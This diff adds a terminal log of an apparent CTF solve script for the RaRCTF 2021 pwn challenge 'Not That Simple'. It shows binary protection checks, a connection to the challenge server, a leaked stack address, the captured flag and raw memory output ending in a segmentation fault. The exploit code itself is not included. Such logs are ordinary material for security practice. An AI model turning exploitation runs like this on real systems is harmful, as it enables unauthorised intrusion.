@@ -1,0 +1,14 @@
+mito@ubuntu:~/CTF/RaRCTF_2021/Pwn_Not_That_Simple_250$ python solve.py r
+[*] '/home/mito/CTF/RaRCTF_2021/Pwn_Not_That_Simple_250/notsimple'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+[+] Opening connection to 193.57.159.27 on port 46343: Done
+stack_leak = 0x7ffec373a250
+rarctf{h3y_wh4ts_th3_r3dpwn_4bs0rpti0n_pl4n_d01n6_h3r3?_4cc9581515}
+[*] Switching to interactive mode
+\x00\x0\x1c\x13    \x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00 \x00notsimple\x00\xfe\x7f\x0`\x85H!b\x7f\x00\x00p�H!b\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9f�&!b\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00`\x85H!b\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00p�H!b\x7f\x00\x00C\x04@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00��s��\x7f\x00\Segmentation fault
+[*] Got EOF while reading in interactive
